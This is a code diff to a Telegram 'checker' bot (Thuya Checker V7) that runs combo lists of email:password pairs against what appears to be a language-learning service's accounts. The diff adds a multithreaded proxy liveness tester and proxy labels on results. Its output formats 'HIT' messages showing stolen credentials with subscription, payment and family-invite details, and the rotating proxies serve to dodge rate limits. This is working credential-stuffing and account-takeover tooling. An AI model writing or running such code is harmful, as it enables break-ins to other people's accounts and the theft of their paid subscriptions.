@@ -172,6 +172,31 @@ def get_random_proxy():
     return None
 
 
+# ========== PROXY LIVE TESTER ==========
+PROXY_TEST_URL = "https://api.ipify.org?format=json"
+
+def test_one_proxy(entry, timeout=12):
+    """Test a single proxy entry. Returns {ok, ip, latency_ms, error}."""
+    proxy_url = get_proxy_url(entry)
+    if not proxy_url:
+        return {"ok": False, "ip": "", "latency": 0, "error": "bad format"}
+    proxies = {"http": proxy_url, "https": proxy_url}
+    t0 = time.time()
+    try:
+        r = requests.get(PROXY_TEST_URL, proxies=proxies, timeout=timeout)
+        latency = int((time.time() - t0) * 1000)
+        if r.status_code == 200:
+            try:
+                ip = r.json().get("ip", "?")
+            except Exception:
+                ip = r.text.strip()[:40]
+            return {"ok": True, "ip": ip, "latency": latency, "error": ""}
+        return {"ok": False, "ip": "", "latency": latency, "error": f"HTTP {r.status_code}"}
+    except Exception as e:
+        latency = int((time.time() - t0) * 1000)
+        return {"ok": False, "ip": "", "latency": latency, "error": str(e)[:60]}
+
+
 
 def create_session():
     session = requests.Session()
@@ -184,15 +209,21 @@ def create_session():
     adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
     session.mount("https://", adapter)
     session.mount("http://", adapter)
-    # Apply random proxy if available
+    # Apply random proxy if available + remember which one was used
+    session._proxy_label = None
     proxy_info = get_random_proxy()
     if proxy_info:
         proxy_url, ptype = proxy_info
-        if ptype in ("SOCKS4", "SOCKS5"):
-            session.proxies = {"http": proxy_url, "https": proxy_url}
-        else:
-            session.proxies = {"http": proxy_url, "https": proxy_url}
-        logging.debug(f"Using proxy: {ptype}")
+        session.proxies = {"http": proxy_url, "https": proxy_url}
+        # Build readable label (host:port + type), credentials masked
+        try:
+            # proxy_url like "http://user:pass@host:port"
+            after_scheme = proxy_url.split("://", 1)[1]
+            host_port = after_scheme.split("@")[-1]
+            session._proxy_label = f"{ptype} ∙ {host_port}"
+        except Exception:
+            session._proxy_label = ptype
+        logging.debug(f"Using proxy: {session._proxy_label}")
     return session
 
 def get_headers(ua, jwt=None):
@@ -548,18 +579,24 @@ def format_hit(email, password, data, plan_type, sub, invite_token=None):
     else:
         header = "💎  𝗦𝗨𝗣𝗘𝗥  𝗣𝗥𝗘𝗠𝗜𝗨𝗠"
 
-    # Tight, mobile-friendly layout
+    # Proxy line (only if used)
+    proxy_line = ""
+    if sub.get("proxy"):
+        proxy_line = f"🌐 Proxy ➜ `{sub['proxy']}`\n"
+
+    # Tight, mobile-friendly layout (one-per-line)
     msg = (
         f"{header}\n"
         f"`{email}:{password}`\n"
         f"\n"
-        f"👤 *{username}*  ·  ⭐ {xp:,}  ·  🔥 {streak}d  ·  💎 {gems:,}\n"
+        f"👤 *{username}*\n"
+        f"⭐ {xp:,}  ·  🔥 {streak}d  ·  💎 {gems:,}\n"
         f"📚 {courses_str}  ←  {from_l}\n"
         f"🔗 {social}\n"
-        f"\n"
         f"💳 {sub['payment']}  ·  {sub['billing']}\n"
         f"🔁 {sub['renew']}  ·  ⏰ {sub['expiry']}\n"
         f"📦 `{sub['product']}`\n"
+        f"{proxy_line}"
         f"\n"
         f"🦉 _Thuya Checker V7_"
     )
@@ -584,6 +621,7 @@ def build_hit_keyboard(email, password, plan_type, sub):
 def check_single_account(email, password):
     # Note: per-user stop is handled by future.cancel() in process_combos
     session = create_session()
+    proxy_label = getattr(session, "_proxy_label", None)
     ua = generate_ua()
 
     for attempt in range(MAX_RETRIES):
@@ -647,6 +685,8 @@ def check_single_account(email, password):
                 return email, password, "FREE", f"{un}|XP:{data.get('totalXp',0)}", None
 
             sub = extract_sub(data)
+            if proxy_label:
+                sub["proxy"] = proxy_label
             result = format_hit(email, password, data, plan_type, sub, invite_token)
             family_invite = sub.get("invite") if plan_type == "FAMILY" else None
             return email, password, "HIT", result, plan_type, family_invite
@@ -836,6 +876,7 @@ Manage your proxy list below."""
         InlineKeyboardButton("📋 LIST", callback_data="proxy_list"),
         InlineKeyboardButton("🗑️ CLEAR ALL", callback_data="proxy_clear")
     )
+    markup.row(InlineKeyboardButton("🧪 TEST LIVE", callback_data="proxy_test"))
     markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
     bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)
 
@@ -1101,6 +1142,64 @@ def callback_handler(call):
             bot.answer_callback_query(call.id, "Cancelled")
             pending_proxy_action.pop(call.from_user.id, None)
             send_proxy_menu(call.message.chat.id)
+
+        elif call.data == "proxy_test":
+            bot.answer_callback_query(call.id, "🧪 Testing…")
+            with proxy_lock:
+                snap = list(proxy_list)
+            if not snap:
+                bot.send_message(call.message.chat.id, "📭 No proxies to test.")
+                send_proxy_menu(call.message.chat.id)
+                return
+
+            chat_id = call.message.chat.id
+            status_msg = bot.send_message(
+                chat_id,
+                f"🧪 *Testing {len(snap)} proxy(s)…*\n_Hitting api.ipify.org via each proxy_",
+                parse_mode='Markdown'
+            )
+
+            def _run_test():
+                results = [None] * len(snap)
+                def _w(i_p):
+                    i, p = i_p
+                    results[i] = (p, test_one_proxy(p))
+                with ThreadPoolExecutor(max_workers=min(20, max(1, len(snap)))) as ex:
+                    list(ex.map(_w, list(enumerate(snap))))
+
+                ok = sum(1 for r in results if r and r[1]["ok"])
+                bad = len(results) - ok
+
+                lines = [
+                    f"🧪 *PROXY TEST RESULT*",
+                    f"✅ Live: *{ok}*  ·  ❌ Dead: *{bad}*",
+                    "─" * 28,
+                ]
+                for i, item in enumerate(results, 1):
+                    if not item:
+                        continue
+                    p, r = item
+                    ptype = p.get("type", "HTTP")
+                    raw = p.get("proxy", "?")
+                    parts = raw.split(":")
+                    display = f"{parts[0]}:{parts[1]}" if len(parts) >= 2 else raw[:20]
+                    icon = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(ptype, "⚪")
+                    head = f"{icon} `[{i}]` {ptype} `{display}`"
+                    if r["ok"]:
+                        lines.append(f"{head}\n   ✅ LIVE · IP `{r['ip']}` · {r['latency']}ms")
+                    else:
+                        lines.append(f"{head}\n   ❌ DEAD · {r['error']} · {r['latency']}ms")
+
+                txt = "\n".join(lines)
+                if len(txt) > 3900:
+                    txt = txt[:3900] + "\n…(truncated)"
+                try:
+                    bot.edit_message_text(txt, chat_id, status_msg.message_id, parse_mode='Markdown')
+                except Exception:
+                    bot.send_message(chat_id, txt, parse_mode='Markdown')
+                send_proxy_menu(chat_id)
+
+            threading.Thread(target=_run_test, daemon=True).start()
 
         # ========== ADMIN PANEL ==========
         elif call.data == "admin_panel":
